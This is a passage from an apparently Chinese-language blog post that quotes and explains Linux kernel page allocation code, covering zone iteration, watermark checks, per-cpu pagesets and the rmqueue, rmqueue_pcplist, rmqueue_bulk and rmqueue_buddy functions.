zone-&gt;zone_pgdat) &#123;</span><br><span class="line">last_pgdat = zone-&gt;zone_pgdat;</span><br><span class="line">last_pgdat_dirty_ok = node_dirty_ok(zone-&gt;zone_pgdat);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!last_pgdat_dirty_ok)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;</span><br><span class="line"><span class="keyword">int</span> local_nid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If moving to a remote node, retry but allow</span></span><br><span class="line"><span class="comment"> * fragmenting fallbacks. Locality is more important</span></span><br><span class="line"><span class="comment"> * than fragmentation avoidance.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);</span><br><span class="line"><span class="keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Detect whether the number of free pages is below high</span></span><br><span class="line"><span class="comment"> * watermark.  If so, we will decrease pcp-&gt;high and free</span></span><br><span class="line"><span class="comment"> * PCP pages in free path to reduce the possibility of</span></span><br><span class="line"><span class="comment"> * premature page reclaiming.  Detection is done here to</span></span><br><span class="line"><span class="comment"> * avoid to do that in hotter free path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (test_bit(ZONE_BELOW_HIGH, &amp;zone-&gt;flags))</span><br><span class="line"><span class="keyword">goto</span> check_alloc_wmark;</span><br><span class="line"></span><br><span class="line">mark = high_wmark_pages(zone);</span><br><span class="line"><span class="keyword">if</span> (zone_watermark_fast(zone, order, mark,</span><br><span class="line">ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">gfp_mask))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">set_bit(ZONE_BELOW_HIGH, &amp;zone-&gt;flags);</span><br><span class="line"></span><br><span class="line">check_alloc_wmark:</span><br><span class="line">mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);</span><br><span class="line"><span class="keyword">if</span> (!zone_watermark_fast(zone, order, mark,</span><br><span class="line">       ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">       gfp_mask)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (has_unaccepted_memory()) &#123;</span><br><span class="line"><span class="keyword">if</span> (try_to_accept_memory(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Watermark failed for this zone, but see if we can</span></span><br><span class="line"><span class="comment"> * grow this zone if it contains deferred pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (deferred_pages_enabled()) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Checked here to keep the fast path fast */</span></span><br><span class="line">BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!node_reclaim_enabled() ||</span><br><span class="line">    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_NOSCAN:</span><br><span class="line"><span class="comment">/* did not scan */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_FULL:</span><br><span class="line"><span class="comment">/* scanned but unreclaimable */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">/* did we reclaim enough */</span></span><br><span class="line"><span class="keyword">if</span> (zone_watermark_ok(zone, order, mark,</span><br><span class="line">ac-&gt;highest_zoneidx, alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_this_zone:</span><br><span class="line">page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,</span><br><span class="line">gfp_mask, alloc_flags, ac-&gt;migratetype);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">prep_new_page(page, order, gfp_mask, alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If this is a high-order atomic allocation then check</span></span><br><span class="line"><span class="comment"> * if the pageblock should be reserved for the future</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(alloc_flags &amp; ALLOC_HIGHATOMIC))</span><br><span class="line">reserve_highatomic_pageblock(page, zone);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (has_unaccepted_memory()) &#123;</span><br><span class="line"><span class="keyword">if</span> (try_to_accept_memory(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/* Try again if zone has deferred pages */</span></span><br><span class="line"><span class="keyword">if</span> (deferred_pages_enabled()) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s possible on a UMA machine to get through all zones that are</span></span><br><span class="line"><span class="comment"> * fragmented. If avoiding fragmentation, reset and try again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (no_fallback) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数的流程大体如下，使用<code>for_next_zone_zonelist_nodemask</code>宏迭代遍历分配上下文中的<code>zonelist</code>中的<code>zoneref</code>数组对应的zone</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> for_next_zone_zonelist_nodemask(zone, z, highidx, nodemask) \</span></span><br><span class="line"><span class="meta">for (zone = z-&gt;zone;\</span></span><br><span class="line"><span class="meta">zone;\</span></span><br><span class="line"><span class="meta">z = next_zones_zonelist(++z, highidx, nodemask),\</span></span><br><span class="line"><span class="meta">zone = zonelist_zone(z))</span></span><br></pre></td></tr></table></figure><p>这里的<code>next_zones_zonelist</code>函数返回的是在<code>nodemask</code>的 zone 中，以当前 zone 作为起点游标的（位于或低于）<code>highest_zoneidx</code> 的下一个 zone。</p><p>接下来进入循环体内部，首先会判断是否开启cpuset并检查当前 zone 是否满足 cpuset 的要求，若否，则尝试下一个 zone。</p><p>检查当前 zone 对应 node 的脏页数量是否超出限制，若否，则尝试下一个 zone。</p><p>若<code>alloc_flags</code>包含<code>ALLOC_NOFRAGMENT</code>但是当前 zone 非<code>preferred zone</code>、且对应 node 部位<code>local node</code>，则清除该标志位后重新开始分配，因为 locality 比避免碎片更加重要。</p><p>后面则是对水位线的一些判断，首先是获取当前 zone 的水位线标记，若是设置了 <code>ALLOC_NO_WATERMARKS</code> 则直接到下一步进行分配，若水位线检查未通过，调用 <code>node_reclaim()</code> 进行页面回收，若回收后页面还是不足，则尝试下一个 zone。</p><p>在经历了前面的for循环之后最终调用<code>rmqueue</code>函数进行正式的内存分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span></span></span><br><span class="line"><span class="function">struct page *<span class="title">rmqueue</span><span class="params">(struct zone *preferred_zone,</span></span></span><br><span class="line"><span class="params"><span class="function">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfp_flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> migratetype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We most definitely don&#x27;t want callers attempting to</span></span><br><span class="line"><span class="comment"> * allocate greater than order-1 page units with __GFP_NOFAIL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(pcp_allowed_order(order))) &#123;</span><br><span class="line">page = rmqueue_pcplist(preferred_zone, zone, order,</span><br><span class="line">       migratetype, alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (likely(page))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page = rmqueue_buddy(preferred_zone, zone, order, alloc_flags,</span><br><span class="line">migratetype);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/* Separate test+clear to avoid unnecessary atomics */</span></span><br><span class="line"><span class="keyword">if</span> ((alloc_flags &amp; ALLOC_KSWAPD) &amp;&amp;</span><br><span class="line">    unlikely(test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags))) &#123;</span><br><span class="line">clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);</span><br><span class="line">wakeup_kswapd(zone, <span class="number">0</span>, <span class="number">0</span>, zone_idx(zone));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数进入之后会首先验证申请的<code>order</code>是否满足通过pcp申请</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">pcp_allowed_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (order &lt;= PAGE_ALLOC_COSTLY_ORDER)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line"><span class="keyword">if</span> (order == pageblock_order)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的pcp指的是<code>per-cpu pageset</code>，这里简单介绍一下<code>per-cpu pageset</code>的概念（在老版本的Linux内核中这的order一般只允许为0时从pcp中申请，发现在新版本的内核中好像是小于等于3即可），在Linux系统中，存在很多阶为0的申请请求，如果每一次的申请请求都需要获取<code>zone-&gt;lock</code>的话，在越多的cpu核心的情况下就会出现越多的锁的竞争。为了解决这一问题，Linux采用的办法就是使用<code>per-cpu pageset</code>即pcp，其会一次性拿很多页存放在cpu中，并且释放的页也会继续存放在这里，等释放的页满了才会一并放回到zone中（我的理解就是一个cache）。</p><p>在通过order的检验之后就会进入内部调用<code>rmqueue_pcplist</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">rmqueue_pcplist</span><span class="params">(struct zone *preferred_zone,</span></span></span><br><span class="line"><span class="params"><span class="function">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> migratetype, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __maybe_unused UP_flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spin_trylock may fail due to a parallel drain or IRQ reentrancy. */</span></span><br><span class="line">pcp_trylock_prepare(UP_flags);</span><br><span class="line">pcp = pcp_spin_trylock(zone-&gt;per_cpu_pageset);</span><br><span class="line"><span class="keyword">if</span> (!pcp) &#123;</span><br><span class="line">pcp_trylock_finish(UP_flags);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On allocation, reduce the number of pages that are batch freed.</span></span><br><span class="line"><span class="comment"> * See nr_pcp_free() where free_factor is increased for subsequent</span></span><br><span class="line"><span class="comment"> * frees.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pcp-&gt;free_count &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"><span class="built_in">list</span> = &amp;pcp-&gt;lists[order_to_pindex(migratetype, order)];</span><br><span class="line">page = __rmqueue_pcplist(zone, order, migratetype, alloc_flags, pcp, <span class="built_in">list</span>);</span><br><span class="line">pcp_spin_unlock(pcp);</span><br><span class="line">pcp_trylock_finish(UP_flags);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">zone_statistics(preferred_zone, zone, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rmqueue_pcplist</code>函数的基本流程就是首先获取掉pcp，随后通过<code>order</code>和迁移类型选择对应的list（当然在老版本的Linux内核中是不需要order的），随后调用<code>__rmqueue_pcplist</code>函数真正申请页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_pcplist</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (list_empty(<span class="built_in">list</span>)) &#123;</span><br><span class="line"><span class="keyword">int</span> batch = nr_pcp_alloc(pcp, zone, order);</span><br><span class="line"><span class="keyword">int</span> alloced;</span><br><span class="line"></span><br><span class="line">alloced = rmqueue_bulk(zone, order,</span><br><span class="line">batch, <span class="built_in">list</span>,</span><br><span class="line">migratetype, alloc_flags);</span><br><span class="line"></span><br><span class="line">pcp-&gt;count += alloced &lt;&lt; order;</span><br><span class="line"><span class="keyword">if</span> (unlikely(list_empty(<span class="built_in">list</span>)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page = list_first_entry(<span class="built_in">list</span>, struct page, pcp_list);</span><br><span class="line">list_del(&amp;page-&gt;pcp_list);</span><br><span class="line">pcp-&gt;count -= <span class="number">1</span> &lt;&lt; order;</span><br><span class="line">&#125; <span class="keyword">while</span> (check_new_pages(page, order));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__rmqueue_pcplist</code>函数的逻辑是比较清晰的，首先会判断<code>list</code>是否为空，如果为空则调用<code>rmqueue_bulk</code>函数从<code>zone</code>取页到pcp中，如果不为空则直接取页面随后通过<code>check_new_pages</code>函数进行检测，通过则直接返回页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rmqueue_bulk</span><span class="params">(struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> count, struct list_head *<span class="built_in">list</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> migratetype, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> __rmqueue(zone, order, migratetype,</span><br><span class="line">alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(page == <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Split buddy pages returned by expand() are received here in</span></span><br><span class="line"><span class="comment"> * physical page order. The page is added to the tail of</span></span><br><span class="line"><span class="comment"> * caller&#x27;s list. From the callers perspective, the linked list</span></span><br><span class="line"><span class="comment"> * is ordered by page number under some conditions. This is</span></span><br><span class="line"><span class="comment"> * useful for IO devices that can forward direction from the</span></span><br><span class="line"><span class="comment"> * head, thus also in the physical page order. This is useful</span></span><br><span class="line"><span class="comment"> * for IO devices that can merge IO requests if the physical</span></span><br><span class="line"><span class="comment"> * pages are ordered properly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_add_tail(&amp;page-&gt;pcp_list, <span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))</span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,</span><br><span class="line">      -(<span class="number">1</span> &lt;&lt; order));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里简单看一下<code>rmqueue_bulk</code>函数，这里会进行<code>batch</code>次循环通过<code>__rmqueue</code>函数申请page并向链表中加入。这里函数内部的<code>__rmqueue</code>函数留在后面一并梳理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline</span></span><br><span class="line"><span class="function">struct page *<span class="title">rmqueue_buddy</span><span class="params">(struct zone *preferred_zone, struct zone *zone,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">int</span> migratetype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_HIGHATOMIC)</span><br><span class="line">page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = __rmqueue(zone, order, migratetype, alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the allocation fails, allow OOM handling access</span></span><br><span class="line"><span class="comment"> * to HIGHATOMIC reserves as failing now is worse than</span></span><br><span class="line"><span class="comment"> * failing a high-order atomic allocation in the</span></span><br><span class="line"><span class="comment"> * future.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!page &amp;&amp; (alloc_flags &amp; ALLOC_OOM))</span><br><span class="line">page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span class="line">  get_pcppage_migratetype(page));</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line">&#125; <span class="keyword">while</span> (check_new_pages(page, order));</span><br><span class="line"></span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">zone_statistics(preferred_zone, zone, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里回到<code>rmqueue</code>函数的流程，如果申请的<code>order</code>不能直接通过pcp进行申请是则会进入<code>rmqueue_buddy</code>函数中。函数内部其会根据不同的<code>alloc_flags</code>通过不同的函数进行分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">rmqueue</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span 